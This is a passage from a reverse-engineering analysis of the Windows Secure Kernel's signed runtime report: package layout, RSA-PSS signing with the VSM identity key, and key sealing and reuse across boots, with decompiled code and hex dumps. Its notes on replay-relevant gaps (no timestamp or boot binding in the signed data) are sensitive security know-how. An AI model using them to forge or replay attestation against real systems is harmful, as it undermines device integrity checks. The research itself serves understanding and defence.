Service codes at or above 0xEF skip the initialization-phase and IRQL checks that apply to lower codes. `SkProduceRuntimeSignedReport` itself checks only four things: `PackageVersion == 1`, a bitmap of exactly 1 (bits 0 and 1 on 28000.3231), a non-NULL size pointer, and the nonce pointer. There is no caller identity to check, since none crosses the boundary, and no HVCI check in the producer. The nonce pointer always points into the argument block on this path, so the 32 bytes are copied into the package unchanged and never inspected.

### 4.1 Reaching the VTL0 Buffer

`SkmmMapDataTransfer` receives the VA of the data MDL and the PFN of the page that holds it. It maps only the 48-byte MDL header first, through a short MDL, and rejects a header that crosses a page. Then it copies the header and the PFN array into a VTL1 pool MDL and maps the described pages from that copy, writable. Every PFN must first pass `SkmiIncrementSharedPageReferenceCount`. A PFN that fails is reported as a security violation (`SKMI_SECURITY`, code 3589), the partial mapping is torn down and the call fails. Because the PFN list is copied before it is validated and used, the NT kernel cannot swap pages under the Secure Kernel after the check.

### 4.2 Assembling and Signing

The package is never built in VTL0 memory. `SkProduceRuntimeSignedReport` allocates a VTL1 pool buffer of the caller's size (tag `RtRp`), writes everything there, and copies the whole buffer out once, at the end, only if signing succeeded. Condensed from the Hex-Rays output:

```c
  pss.pszAlgId = L"SHA512"; pss.cbSalt = 64;                       // BCRYPT_PSS_PADDING_INFO
  SkpInitIdkEncryption(IumIdkSigningHandle, &hAlg, &hKey);         // see section 5
  N = popcnt(bitmap);
  signedSize = 72 + 68*N;                                          // header + nonce + digest headers
  BCryptSignHash(hKey, &pss, hash, 64, NULL, 0, &sigLen, BCRYPT_PAD_PSS);   // size only
  ...
  Pool = SkAllocatePool(1, ByteCount, 'RtRp');                     // VTL1 copy, caller-sized
  Pool->Magic = 'RTRP'; Pool->PackageVersion = 1; Pool->NumberOfReports = N;
  Pool->ReportTypesBitmap = bitmap; Pool->ReportDigestType = CALG_SHA_512;
  Pool->TotalReportDigestsSize = 68*N; Pool->SignatureScheme = 1; Pool->SignatureSize = sigLen;
  memcpy(Pool->Nonce, nonce, 32);
  SkpBuildAuthenticatedRuntimeReports(bitmap, Pool + signedSize + sigLen, &avail);
  Pool->PackageSize = avail + signedSize + sigLen; Pool->TotalAuthenticatedReportsSize = avail;
  SkpBuildRuntimeReportDigestHeaders(reports, avail, N, Pool + 0x48);   // SHA-512 per report
  SkpCngHashData(L"SHA512", Pool, signedSize, hash, 64);
  BCryptSignHash(hKey, &pss, hash, 64, Pool + signedSize, sigLen, &sigLen, BCRYPT_PAD_PSS);
  if ( sigLen == Pool->SignatureSize ) memmove(vtl0Buffer, Pool, ByteCount);
```

The resulting layout matches the SDK's comment, with N = 1 on 26100.x and a 256-byte signature:

| offset | size | field | covered by the signature |
|---|---|---|---|
| 0x00 | 0x28 | `RUNTIME_REPORT_PACKAGE_HEADER` (magic `RTRP`, version 1, N, bitmap, sizes, `CALG_SHA_512`, scheme 1, `SignatureSize`) | directly |
| 0x28 | 0x20 | the caller's nonce | directly |
| 0x48 | 0x44 | `RUNTIME_REPORT_DIGEST_HEADER`: report type and SHA-512 of the report, header included | directly |
| 0x8C | 0x100 | RSA-PSS signature | is the signature |
| 0x18C | variable | the driver report | only through its digest |

Here is what that looks like in a real package from my machine: the one from the key-lifetime experiment in section 5.5 (182 drivers, 19,793 bytes).

```
00000000  50 52 54 52 01 00 01 00 01 00 00 00 00 00 00 00   magic, PackageVersion 1, 1 report, bitmap 0x1
00000010  51 4d 00 00 0e 80 44 00 00 00 01 00 00 01 00 00   PackageSize 19793, CALG_SHA_512, 68, Reserved, scheme 1, SignatureSize 256
00000020  c5 4b 00 00 00 00 00 00 9c b1 a1 71 c9 27 4a 61   reports 19397, padding (zero), nonce ...
00000030  36 90 08 98 ab 4e b8 27 fc 9a e2 ac a9 b6 8a 3c
00000040  ef 53 4c 2c 00 1f 43 20 00 00 00 00 59 7f c8 92   ... nonce, digest header: ReportType 0, SHA-512 ...
  ...
0000008c  d5 7a 69 9e 9d 70 35 0a 4d 4c bc 64 cd d1 ca 4a   RSA-PSS signature, 256 bytes
  ...
0000018c  00 00 00 00 c5 4b 00 00 b6 00 00 00               driver report: type 0, size 19397, 182 drivers, flags 0
```

The magic reads `PRTR` in memory because the SDK's `0x52545250` ("RTRP") is stored little-endian. Everything up to offset 0x8B is what the signature covers; the 19,397-byte driver report after the signature is covered only through the SHA-512 at 0x4C.

So the signed bytes are exactly the first 140: header, nonce and digest header. The signature is RSA-PSS with SHA-512 and a 64-byte salt over the SHA-512 of those bytes, and the report itself is "authenticated (but unsigned)", as the SDK puts it, through its digest. And since PSS uses a random salt, asking twice with the same nonce gives two different, equally valid signatures over identical signed bytes, which is what I saw on the test machine (section 11).

What the signed part does not contain matters as much. There is no timestamp, boot counter, boot ID, sequence number, key identifier, device identifier or requester identity anywhere in the package. Freshness is entirely the verifier's nonce, and the boot binding, if any, comes from the key.

### 4.3 Sizes and Statuses

The package size is `72 + 68*N + SignatureSize + TotalAuthenticatedReportsSize`. The producer has three paths. Without an output buffer (a size query) it runs the builders as a dry run and returns `STATUS_BUFFER_TOO_SMALL` with the required size; that is the status the 7309 kernelbase special-cased. With a buffer that is too small for the header and signature, it does the same dry run. With a big enough buffer it builds for real, and if the driver table grew between your size query and your real query, you get `STATUS_BUFFER_TOO_SMALL` and the new size, with nothing copied.

The one VTL1 refusal that is not about parameters is an empty driver table: `SkpBuildNtDriversReport` returns `STATUS_NOT_SUPPORTED` when nothing has been recorded, and no package is produced. Section 6 shows that "nothing recorded" is exactly what happens when HVCI is off.

---

## 5. The Signing Key

### 5.1 Which Key

The handle is `IumIdkSigningHandle`, the VSM identity signing key. Trehan calls it IDKS and Allievi calls it the Secure Kernel signing IDK; it is the same object. On every request `SkpInitIdkEncryption` copies the stored blob out of the Secure Kernel key store into a temporary pool buffer, imports it with `BCryptImportKeyPair(L"RSAPRIVATEBLOB", ...)`, and wipes the copy; the key handle is destroyed after signing.

The Secure Kernel never generates this key. `SkpCopyKeysFromLoaderBlock` copies it from the loader block (+0x308 size, +0x310 bytes) into the key store and wipes the loader copy; `winload.efi` filled those offsets in `OslVsmProvisionIdk`. Winload generates the key with SymCrypt as RSA-2048 with public exponent 65537, and `OslVsmpMeasureOneIdk` refuses any other size, so `SignatureSize` is 256, which is what real packages show.

The same key also signs VBS enclave reports and a few other Secure Kernel signatures (`SkProduceEnclaveSignedReport`, `SkGetIdkSignatureForData`), with RSA-PSS over SHA-256 and a 32-byte salt. Only the runtime report uses SHA-512 with a 64-byte salt. There is no context label in the signed data. The separation between these uses rests on the PSS parameters and the `RTRP` magic. A standard PSS-SHA-512 verifier rejects the SHA-256 signatures, so as far as I can tell the other signing paths do not produce valid runtime report signatures.

### 5.2 How a Verifier Gets the Public Key

Winload measures the public halves of both VSM keys into the Measured Boot (TCG) log: `SIPAEVENT_VSM_IDK_INFO` (0x50020) for the encryption key and `SIPAEVENT_VSM_IDKS_INFO` (0x50023, "Describes the VSM/IUM identity signing public key" in `wbcl.h`) for the signing key. The payload is `SIPAEVENT_VSM_IDK_INFO_PAYLOAD`: a key algorithm ID of 1, the bit length, the exponent and modulus sizes, then exponent and modulus big-endian. On my machine the event sits in PCR 12 and describes a 2048-bit key with exponent 65537. That is the verifier flow Allievi describes: check a TPM quote over the PCRs, replay the TCG log against it, take the IDKS from that event, and verify the package with it. The quote is what makes the key trustworthy: a key that merely appears in a log file proves nothing.

This is the event from the boot that produced the package above, straight out of `C:\Windows\Logs\MeasuredBoot`:

```
00000000  23 00 05 00 13 01 00 00 01 00 00 00 00 08 00 00   SIPAEVENT_VSM_IDKS_INFO, 275 bytes; KeyAlgID 1, 2048 bits
00000010  03 00 00 00 00 01 00 00 01 00 01 ec 81 29 f0 55   exponent 3 bytes, modulus 256 bytes; e = 01 00 01; modulus ...
00000020  05 c9 79 5b b3 71 68 fc d5 f1 3a 8b ff a9 d3 fc
  ...
```

The measurement only happens when winload sees a TPM 2.0. Without one there is no measured IDKS and therefore nothing to verify a package against.

### 5.3 How Long the Key Lives

This is where the public descriptions stop, and it matters for replay. `wbcl.h` documents two provisioning modes, logged as `SIPAEVENT_IDK_GENERATION_STATUS`: `IDK_PROVISIONING_TYPE_HW` (0), "Uses Cached IDKS if available", and `IDK_PROVISIONING_TYPE_VTPM` (1), a new IDKS on every boot. `VsmProvisionIdk` implements both. Behind a feature gate and only with a hypervisor present, it takes the VTPM path and always generates new keys. Otherwise it first tries to read a persisted, encrypted key payload, unseal it with the TPM and reuse it, and only if that fails generates new keys, which it seals to PCR values and persists again. My machine logs mode 0. The VM mode is real too: in a Hyper-V virtual machine with a virtual TPM, event 45 (below) reports the unseal step as not performed, the TCG log records `SIPAEVENT_IDK_GENERATION_STATUS = 1`, and every boot gets a new key.

The seal is what decides how long the key lives, so I followed it. The keys are stored encrypted on disk, and what goes into the TPM is the secret that protects that payload. `OslVsmpEncryptAndSealIdk` calls `BlSealSecretToPcrValues` with a NULL PCR-info pointer and the mask 0x766FB5. Hex-Rays gets the first argument of this call wrong, so here is the assembly:

```
0003ad65  xor     r9d, r9d                   ; PCR info = NULL: use current values
0003ad75  mov     r8d, 766FB5h               ; PCR mask
0003ad7b  call    BlSealSecretToPcrValues
```

With no PCR info, `BlSealSecretToPcrValues` reads the current values of the masked PCRs with `SipaReadPcrsByMask` and seals to them. The next boot's `VsmProvisionIdk` passes the same constant to `TpmApiUnsealEx`. 0x766FB5 selects PCRs 0, 2, 4, 5, 7, 8, 9, 10, 11, 13, 14, 17, 18, 20, 21 and 22. PCR 12, where the boot counter is measured, is not in the set, which is what makes reuse across boots possible at all.

### 5.4 Watching the Key Rotate
